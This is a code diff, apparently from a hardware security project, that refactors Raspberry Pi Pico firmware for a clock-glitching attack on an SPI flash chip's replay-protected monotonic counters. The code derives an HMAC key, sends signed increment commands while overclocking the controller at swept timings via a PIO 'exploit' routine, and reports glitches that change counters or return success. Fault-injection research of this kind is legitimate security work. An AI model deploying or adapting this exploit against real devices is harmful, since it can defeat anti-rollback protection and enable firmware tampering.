@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
 #include <stddef.h>
 #include "pico/stdlib.h"
@@ -15,14 +16,6 @@ struct pio_instance {
     unsigned int state_machine;
     int load_offset;
 };
-
-// Hopefully this can handle multithreading :)
-struct pio_instance spi_pio_instance = {
-    .pio = pio0,
-    .state_machine = 0
-};
-
-#define NUM_COUNTERS 4
 
 int __time_critical_func(pio_spi_write)(struct pio_instance * const spi, const uint8_t * src, const size_t len)
 {
@@ -45,6 +38,11 @@ int __time_critical_func(pio_spi_write)(struct pio_instance * const spi, const u
             --rx_remain;
         }
     }
+}
+
+inline int rpmc_ops_spi_write(void * spi_connection, const uint8_t * write_buffer, size_t write_amount)
+{
+    return pio_spi_write((struct pio_instance *)spi_connection, write_buffer, write_amount);
 }
 
 int __time_critical_func(pio_spi_recieve)(struct pio_instance * const spi, const uint8_t write_placeholder, uint8_t * dest, const size_t len)
@@ -70,48 +68,54 @@ int __time_critical_func(pio_spi_recieve)(struct pio_instance * const spi, const
     }
 }
 
-static int get_all_counter_values(void * const spi_connection, const unsigned int cs_pin, const uint8_t hmac_key[RPMC_HMAC_KEY_LENGTH], uint32_t values[NUM_COUNTERS])
+inline int rpmc_ops_spi_read(void * spi_connection, uint8_t fill_char, uint8_t * read_buffer, size_t read_amount)
 {
-    for (uint8_t counter = 0; counter < NUM_COUNTERS; counter++) {
-        if (get_counter_value(&spi_pio_instance, cs_pin, counter, hmac_key, values++)) {
+    return pio_spi_recieve((struct pio_instance *)spi_connection, fill_char, read_buffer, read_amount);
+}
+
+static void transmit_glitch_cycles(struct pio_instance * const spi_connection, const uint32_t glitch_cycles)
+{
+    // There should be no current tranmission going on
+    // Clear the fifos just in case
+    pio_sm_clear_fifos(spi_connection->pio, spi_connection->state_machine);
+    
+    // Jump to exploit code and give it the cycles to glitch after
+    pio_sm_exec(spi_connection->pio, spi_connection->state_machine, pio_encode_jmp(spi_connection->load_offset + spi_with_setup_for_glitch_offset_setup_glitch));
+    pio_sm_put_blocking(spi_connection->pio, spi_connection->state_machine, glitch_cycles);
+}
+
+static int get_all_counter_values(struct pio_instance * const spi_connection,
+                                  const uint8_t hmac_key[RPMC_HMAC_KEY_LENGTH],
+                                  const unsigned int cs_pin,
+                                  const size_t num_counters,
+                                  uint32_t values[num_counters])
+{
+    for (uint8_t counter = 0; counter < num_counters; counter++) {
+        if (get_counter_value(spi_connection, cs_pin, counter, hmac_key, values++)) {
             return 1;
         }
     }
     return 0;
 }
 
-static int loop(const unsigned int led_pin, const unsigned int cs_pin)
+static int glitch_increment(struct pio_instance * const spi_connection,
+                            const uint8_t const hmac_key[RPMC_HMAC_KEY_LENGTH],
+                            const unsigned int cs_pin,
+                            const uint8_t target_counter,
+                            const size_t num_counters,
+                            const uint32_t const old_counter_values[num_counters])
 {
-    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00}; 
-    const uint8_t target_counter = 0;
-
-    uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
-    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
-        printf("Error: could not generate the hmac key\n");
+    // Yes I just found out about typeof :)
+    uint32_t * new_counter_values = malloc(sizeof(uint32_t) * num_counters);
+    if (new_counter_values == NULL) {
+        printf("Could not allocate new counter values\n");
         return 1;
     }
-    
-    for (uint8_t counter = 0; counter < NUM_COUNTERS; counter++) {
-        if (update_hmac_key_register(&spi_pio_instance, cs_pin, counter, hmac_key_register, key_data)) {
-            printf("Error: could not set initialize hmac key register\n");
-            return 1;
-        }
-    }
-
-    uint32_t old_counter_values[NUM_COUNTERS];
-    if (get_all_counter_values(&spi_pio_instance, cs_pin, hmac_key_register, old_counter_values)) {
-        printf("Error: could not get old counter values\n");
-        return 1;
-    }
-
+    int ret = 0;
     // sign the message
     const uint32_t exploit_value = 0;
     const size_t signature_offset = RPMC_OP1_MSG_HEADER_LENGTH + RPMC_COUNTER_LENGTH;
-    unsigned char increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
+    uint8_t increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
         OP1_OPCODE, // Opcode
         0x02, // CmdType
         target_counter, // CounterAddr
@@ -122,57 +126,92 @@ static int loop(const unsigned int led_pin, const unsigned int cs_pin)
         exploit_value & 0xff
     };
     if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
-                        hmac_key_register,
+                        hmac_key,
                         RPMC_HMAC_KEY_LENGTH,
                         increment_msg,
                         signature_offset,
                         increment_msg + signature_offset)) {
         printf("Error: can't sign hmac increment counter message\n");
-        return 1;
+        ret = 1;
+        goto cleanup;
     };
 
-    const uint32_t overclock_hz = 250U * 1000 * 1000;
+    const uint32_t overclock_hz = 266U * 1000 * 1000;
     const uint32_t base_clocks_hz = clock_get_hz(clk_sys);
 
-    printf("Starting glitch with overclock of %u hz:\n", overclock_hz);
+    printf("Trying to glitch increment with overclock of %u hz:\n", overclock_hz);
     // This tries a clock glitch after every cycle
     for (size_t glitch_cycles = 0; glitch_cycles < RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH * 8 * 2; glitch_cycles++) {
         // Send this to clear any previous request results from the device
         // Without this glitching after 7 and 13 return successful status, because previous was successfull and command is not read correctly
-        spi_transaction(&spi_pio_instance, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
+        spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
         
-        // There should be no current tranmission going on
-        // Clear the fifos just in case
-        pio_sm_clear_fifos(spi_pio_instance.pio, spi_pio_instance.state_machine);
-        
-        // Jump to exploit code and give it the cycles to glitch after
-        pio_sm_exec(spi_pio_instance.pio, spi_pio_instance.state_machine, pio_encode_jmp(spi_pio_instance.load_offset + spi_with_setup_for_glitch_offset_setup_glitch));
-        pio_sm_put_blocking(spi_pio_instance.pio, spi_pio_instance.state_machine, glitch_cycles);
+        transmit_glitch_cycles(spi_connection, glitch_cycles);
 
         set_sys_clock_hz(overclock_hz, true);
-        spi_transaction(&spi_pio_instance, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
+        spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
         set_sys_clock_hz(base_clocks_hz, true);
 
-        poll_until_finished(&spi_pio_instance, cs_pin);
+        poll_until_finished(spi_connection, cs_pin);
 
-        uint8_t status = get_rpmc_status(&spi_pio_instance, cs_pin);
-        uint32_t new_counter_values[NUM_COUNTERS];
-        if (get_all_counter_values(&spi_pio_instance, cs_pin, hmac_key_register, new_counter_values)) {
+        const uint8_t status = get_rpmc_status(spi_connection, cs_pin);
+        if (get_all_counter_values(spi_connection, hmac_key, cs_pin, num_counters, new_counter_values)) {
             printf("Error: could not get new counter values\n");
-            return 1;
+            ret = 1;
+            goto cleanup;
         }
 
-        if (status == 0x80 || new_counter_values[target_counter] != old_counter_values[target_counter]) {
-            printf("Glitch after %u cycles: Glitch was successfull status: 0x%02x\n", glitch_cycles, status);
-            for (size_t counter = 0; counter < NUM_COUNTERS; counter++) {
-                printf("                        counter %u %u -> %u\n", counter, old_counter_values[counter], new_counter_values[counter]);
+        if (status == 0x80 
+            || memcmp(old_counter_values, new_counter_values, num_counters * sizeof(*old_counter_values)) != 0) {
+            printf("Glitch after %u cycles: success (status: 0x%02x)\n", glitch_cycles, status);
+            for (size_t counter = 0; counter < num_counters; counter++) {
+                printf("                        counter %u: %u -> %u\n", counter, old_counter_values[counter], new_counter_values[counter]);
             }
         } else if (status != 0x10) {
-            printf("Glitch after %u cycles: Glitch had unexpected status 0x%02x\n", glitch_cycles, status);
+            printf("Glitch after %u cycles: semi-success (status 0x%02x)\n", glitch_cycles, status);
+        }
+    }    
+    printf("Done\n");
+
+cleanup:
+    free(new_counter_values);
+    return ret;
+}
+
+static int loop(struct pio_instance * const spi_connection, const unsigned int led_pin, const unsigned int cs_pin)
+{
+    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00};
+    const size_t num_counters = 4;
+
+    uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
+    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
+        printf("Error: could not generate the hmac key\n");
+        return 1;
+    }
+
+    // Initialize hmac key register for all counters
+    for (uint8_t counter = 0; counter < num_counters; counter++) {
+        if (update_hmac_key_register(spi_connection, cs_pin, counter, hmac_key_register, key_data)) {
+            printf("Error: could not set initialize hmac key register\n");
+            return 1;
         }
     }
-    
-    printf("Done\n");
+
+    // Read out all previous values in case we are able to change one
+    uint32_t old_counter_values[num_counters];
+    if (get_all_counter_values(spi_connection, hmac_key_register, cs_pin, num_counters, old_counter_values)) {
+        printf("Error: could not get old counter values\n");
+        return 1;
+    }
+
+    int ret = glitch_increment(spi_connection, hmac_key_register, cs_pin, 0, num_counters, old_counter_values);
+    if (ret)
+        return ret;
+
     return 0;
 }
 
@@ -231,6 +270,11 @@ int main()
         return 1;
     }
 
+    struct pio_instance spi_pio_instance = {
+        .pio = pio0,
+        .state_machine = 0
+    };
+
     spi_pio_instance.load_offset = pio_add_program(spi_pio_instance.pio, &spi_with_setup_for_glitch_program);
     if (spi_pio_instance.load_offset < 0) {
         printf("Error: could not add pio programm\n");
@@ -256,10 +300,7 @@ int main()
     // Make the CS pin available to picotool
     bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_CSN_PIN, "SPI CS"));
 
-    init_spi_transmission_function((int (*)(void *, uint8_t, const uint8_t *, size_t))pio_spi_recieve,
-                                   (int (*)(void *, const uint8_t *, size_t))pio_spi_write);
-
-    int ret = loop(CYW43_WL_GPIO_LED_PIN, PICO_DEFAULT_SPI_CSN_PIN);
+    int ret = loop(&spi_pio_instance, CYW43_WL_GPIO_LED_PIN, PICO_DEFAULT_SPI_CSN_PIN);
 
     while (true)
         ;
